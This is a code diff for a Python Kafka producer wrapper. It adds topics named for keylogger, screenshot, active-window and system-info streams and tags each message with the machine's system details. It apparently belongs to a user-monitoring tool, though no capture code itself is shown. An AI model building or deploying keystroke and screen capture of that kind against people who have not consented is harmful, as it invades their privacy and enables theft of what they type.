@@ -1,9 +1,14 @@
 from kafka import KafkaProducer
 from kafka.errors import KafkaError
 import json
-import time
+from capturing.SystemTracker import SystemTracker
 
 class KafkaProducerWrapper:
+    
+    ACTIVE_WINDOW_TOPIC = 'ro.popa.active-window.new'
+    SYSTEM_INFO_TOPIC = 'ro.popa.system-info.new'
+    KEYLOGGER_TOPIC = 'ro.popa.keylogger.new'
+    SCREENSHOT_TOPIC = 'ro.popa.screenshot.new'
     """
     bootstrap_servers: list of kafka brokers
     example: [localhost:9092]
@@ -18,8 +23,13 @@ class KafkaProducerWrapper:
         
     def send_message(self, topic, data):
         try:
-            future = self.producer.send(topic, data)
+            payload = {
+                "user": SystemTracker.system_info,
+                "data": data
+            }
+            future = self.producer.send(topic, payload)
             self.producer.flush()
+            print("Sent kafka message...:", payload)
             return future.get()
         except KafkaError as e:
             # TODO:Logging error
